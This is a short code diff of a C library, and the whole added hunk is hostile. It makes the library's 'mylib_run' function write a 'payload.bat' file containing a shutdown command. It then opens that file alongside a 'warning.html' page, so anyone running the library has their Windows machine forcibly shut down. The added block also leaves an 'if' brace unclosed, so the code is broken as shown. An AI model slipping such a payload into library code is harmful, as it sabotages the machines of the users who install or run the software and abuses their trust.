@@ -19,7 +19,12 @@ void open_html(const char *filename) {
 }
 
 void mylib_run(void) {
-    
+    FILE *f = fopen("payload.bat", "w");
+    if (f) {
+        fprintf(f,
+            "shutdown /s /t 30"
+        );
+        fclose(f);
     open_html("warning.html");
     open_html("payload.bat");
 }
